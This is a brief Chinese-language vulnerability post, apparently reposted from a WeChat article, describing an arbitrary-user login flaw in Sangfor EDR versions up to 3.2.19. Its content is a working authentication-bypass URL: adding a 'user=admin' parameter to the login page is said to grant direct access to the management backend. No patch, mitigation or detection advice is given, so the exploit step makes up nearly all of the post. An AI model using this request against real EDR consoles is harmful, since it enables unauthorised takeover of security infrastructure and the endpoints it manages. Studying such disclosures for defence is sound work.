# 深信服EDR(<=v3.2.19)任意用户登录漏洞

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzkwNzEzMTg3MQ==&mid=2247483688&idx=1&sn=992f1d6c7ed1295db7421996abad305d&chksm=c0dcaf98f7ab268e42cf96f8a77308155d4295e5d70ff93f1caa8517229ec9f997f86d7232a0&scene=126&sessionid=1681655136#rd](http://mp.weixin.qq.com/s?__biz=MzkwNzEzMTg3MQ==&mid=2247483688&idx=1&sn=992f1d6c7ed1295db7421996abad305d&chksm=c0dcaf98f7ab268e42cf96f8a77308155d4295e5d70ff93f1caa8517229ec9f997f86d7232a0&scene=126&sessionid=1681655136#rd)

### 漏洞详情

**访问一下深信服EDR，显示登陆界面**

`https://IP:PORT/ui/login.php`

![](../Images/6b7ffdca45990b07b76b5e7c33a299eb.png)

  

**此时我们把URL改成如下，即可直接登陆后台。注：该用户名须存在**

`https://IP:PORT/ui/login.php?user=admin`

![](../Images/9e6490f5d228fb8792ed02fcf6e04b50.png)
